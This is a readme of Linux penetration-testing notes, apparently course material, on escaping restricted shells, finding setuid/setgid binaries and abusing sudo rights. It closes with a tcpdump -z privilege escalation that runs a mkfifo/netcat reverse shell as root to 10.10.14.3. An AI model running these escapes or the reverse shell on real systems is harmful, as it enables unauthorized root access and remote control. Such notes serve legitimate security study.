readme.md


<a id="orge65b171"></a>

## Escaping Restricted Shell

A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories.

`Exemple Restricted Shell`

1.  **RBASH**
    [Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)(`rbash`) is a restricted version of the Bourne shell, a standard command-line interpreter in
    Linux which limits the user's ability to use certain features of the Bourne shell, such as changing directories,
    setting or modifying environment variables, and executing commands in other directories. It is often used to
    provide a safe and controlled environment for users who may accidentally or intentionally damage the system.
    Utils command:
    
        compgen -c # List all possible usage command
        ssh user@server_name-t "bash --noprofile" #change rbash to bash
    
    a) start bash without source'ing either ~/.bashrc or ~/.bash<sub>profile</sub> 
    b) since such a shell wouldn't be a full login shell / have no tty attached, force ssh to attach a tty:

2.  **RKSH**
    [Restricted Korn Shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command)(`rksh`) is a restricted version of the Korn shell, another standard command-line interpreter.
    The `rksh` shell limits the user's ability to use certain features of the Korn shell, such as executing commands in
    other directories, creating or modifying shell functions, and modifying the shell environment.
3.  **RZSH**
    [Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)(`rzsh`) is a restricted version of the Z shell and is the most powerful and flexible command-line
    interpreter. The `rzsh` shell limits the user's ability to use certain features of the Z shell, such as running
    shell scripts, defining aliases, and modifying the shell environment.

`Escaping`

1.  `Command Injection`
    For example, we could use the following command to inject a pwd command into the argument of the ls command:
    
        ls -l `pwd`
    
    This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd
    command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and
    see the current working directory, even though the shell does not allow us to execute the pwd command directly.
2.  `Command Substitution`
    Another method for escaping from a restricted shell is to use command substitution. This involves using the
    shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute
    commands by enclosing them in backticks (\`). In that case, it may be possible to escape from the shell by
    executing a command in a backtick substitution that is not restricted by the shell.
3.  `Command Chaining`
    In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to
    use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a
    vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by
    semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of
    which is not restricted by the shell.
4.  `Environment Variables`
    For escaping from a restricted shell to use environment variables involves modifying or creating environment
    variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell
    uses an environment variable to specify the directory in which commands are executed, it may be possible to escape
    from the shell by modifying the value of the environment variable to specify a different directory.
5.  `Shell Functions`
    In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that
    execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape
    from the shell by defining a shell function that executes a command.


<a id="org11b5dd7"></a>

# Permissions-based Privilege Escalation


<a id="org028595a"></a>

## Special Permisions


<a id="org7e850c5"></a>

### `setuid`

The `Set User ID upon Execution (setuid)` permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`

    find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. Many programs have additional features that can be leveraged to execute commands and, if the setuid bit is set on them, these can be used for our purpose.


<a id="org5ef7a5c"></a>

### `setgiu`

The `Set-Group-ID (setgid)` permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command:

    find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

This [resource](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) has more information about the setuid and setgid bits, including how to set the bits.


<a id="org62b20ef"></a>

## Sudo Rights Abuse

Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in /etc/sudoers. When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`. Sometimes we will need to know the user's password to list their `sudo` rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

    sudo -l
    
    Matching Defaults entries for sysadm on NIX02:
          env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User sysadm may run the following commands on NIX02:
          (root) NOPASSWD: /usr/sbin/tcpdump

For example, if the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the **postrotate-command** option.

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:

    sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

Let's try this out. First, make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner.

    cat /tmp/.test
    
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
